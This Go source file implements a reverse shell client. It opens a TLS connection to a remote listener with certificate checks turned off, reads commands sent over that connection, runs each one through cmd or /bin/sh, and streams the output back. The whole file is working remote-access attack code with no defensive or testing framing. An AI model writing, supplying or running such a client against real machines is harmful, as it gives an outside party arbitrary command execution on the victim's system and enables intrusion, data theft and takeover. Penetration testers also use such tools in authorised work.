package client

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// ReverseClient represents a reverse shell client
type ReverseClient struct {
	target      string
	conn        *tls.Conn
	reader      *bufio.Reader
	writer      *bufio.Writer
	isConnected bool
}

// NewReverseClient creates a new reverse client
func NewReverseClient(target string) *ReverseClient {
	return &ReverseClient{
		target: target,
	}
}

// Connect establishes connection to the listener
func (rc *ReverseClient) Connect() error {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	log.Printf("Connecting to listener at %s...", rc.target)
	conn, err := tls.Dial("tcp", rc.target, tlsConfig)
	if err != nil {
		return fmt.Errorf("failed to connect to listener: %v", err)
	}

	rc.conn = conn
	rc.reader = bufio.NewReader(conn)
	rc.writer = bufio.NewWriter(conn)
	rc.isConnected = true

	log.Println("Connected to listener successfully")
	return nil
}

// IsConnected returns whether the client is connected
func (rc *ReverseClient) IsConnected() bool {
	return rc.isConnected && rc.conn != nil
}

// Close closes the connection
func (rc *ReverseClient) Close() error {
	rc.isConnected = false
	if rc.conn != nil {
		return rc.conn.Close()
	}
	return nil
}

// ExecuteCommand runs a shell command and returns output
func (rc *ReverseClient) ExecuteCommand(command string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
	}
	return string(output)
}

// HandleCommands listens for commands and executes them
func (rc *ReverseClient) HandleCommands() error {
	for {
		// Set read deadline to allow graceful shutdown
		rc.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		line, err := rc.reader.ReadString('\n')
		rc.conn.SetReadDeadline(time.Time{})

		if err != nil {
			if err == io.EOF {
				return nil
			}
			if netErr, ok := err.(interface{ Timeout() bool }); ok && netErr.Timeout() {
				continue
			}
			return fmt.Errorf("read error: %v", err)
		}

		command := strings.TrimSpace(line)
		if command == "" {
			continue
		}

		log.Printf("Received command: %s", command)

		if command == "exit" {
			return nil
		}

		output := rc.ExecuteCommand(command)
		rc.writer.WriteString(output)
		rc.writer.WriteString("<<<END_OF_OUTPUT>>>\n")
		rc.writer.Flush()
	}
}
